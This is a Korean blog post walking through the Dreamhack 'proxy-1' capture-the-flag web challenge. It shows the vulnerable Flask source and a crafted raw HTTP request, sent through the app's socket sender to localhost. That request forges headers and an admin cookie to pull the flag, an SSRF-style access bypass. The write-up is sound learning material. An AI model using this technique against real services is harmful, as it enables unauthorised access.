---
title: (1) Dreamhack proxy-1 문제 풀이
date: 2024-01-06 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
Raw Socket Sender가 구현된 서비스입니다.  
요구하는 조건을 맞춰 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.

## 문제 풀이
일단 사이트에 접속해 봅니다.
![](http://kyuyeop.github.io/assets/img/post/1/1.png)
이런 사이트가 나타납니다. Raw Socket Sender에서 플래그를 획득해야 하니 들어가 봅니다.
![](http://kyuyeop.github.io/assets/img/post/1/2.png)
사이트만 봐도 host port data의 입력값을 그대로 보내줄것 같이 생겼습니다. 이제 코드를 확인해 봅시다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('socket.html')
    elif request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port', type=int)
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                s.sendall(data.encode())
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break
            
        except Exception as e:
            return render_template('socket_result.html', data=e)
        
        return render_template('socket_result.html', data=retData)


@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG

app.run(host='0.0.0.0', port=8000)
```
flask로 구현된 코드이고, socket페이지의 폼에서 입력된 값을 보낸 다음 값을 받아오는 걸 볼 수 있습니다.  
여기서 주의깊게 봐야할 곳은 admin페이지 입니다.
```python
@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG
```
코드를 보아하니 admin페이지에 post 형식으로 다음과 같은 데이터를 보내면 flag가 출력된다고 합니다.  
만약 잘못된 데이터를 보냈다면 그에 맞는 에러 메세지를 보내줄 겁니다.  
```
1.클라이언트 ip=127.0.0.1  
2.User-Agent 헤더=Admin Browser  
3.DreamhackUser 헤더=admin  
4.admin 쿠키=true  
5.form에서 전송된 userid=admin  
```

먼저 클라이언트 ip=127.0.0.1이어야 하고, 로컬에서 8000번 포트를 사용중이므로
```
host:127.0.0.1
port:8000
```
다음과 같이 설정해 줍니다. 2~5조건에 맞추어 data를 구성해봅니다.
```
POST /admin HTTP/1.1
Host: host3.dreamhack.games
```
먼저 기본적인 틀을 만들어 주었습니다.  
헤더로 전송되는 데이터 2개를 추가해보겠습니다. 헤더에서 데이터는 헤더:값 형태로 전달해 줄 수 있습니다.
```
POST /admin HTTP/1.1
Host: host3.dreamhack.games
User-Agent:Admin Browser
DreamhackUser:admin
```
쿠키는 cookie: 쿠키=값 형태로 전달합니다.
```
POST /admin HTTP/1.1
Host: host3.dreamhack.games
User-Agent:Admin Browser
DreamhackUser:admin
cookie: admin=true
```
form으로 userid를 보내줘야하기 때문에 Content-Type은 application/x-www-form-urlencoded로, Content-Length는 userid=admin의 길이인 12로 설정, body는 userid=admin으로 설정했습니다.
```
POST /admin HTTP/1.1
Host: host3.dreamhack.games
User-Agent:Admin Browser
DreamhackUser:admin
cookie: admin=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin
```
![](http://kyuyeop.github.io/assets/img/post/1/3.png)
이렇게 설정하고 send를 누르면
![](http://kyuyeop.github.io/assets/img/post/1/4.png)
DH로 시작하는 flag를 얻을 수 있습니다. 
   
LEVEL 1에 해당하는 문제라 http requset의 데이터 구조만 알고 있다면 어렵지 않게 풀 수 있었습니다.  
저는 생각난 김에 http header 복습하로 가겠습니다.
{% endraw %}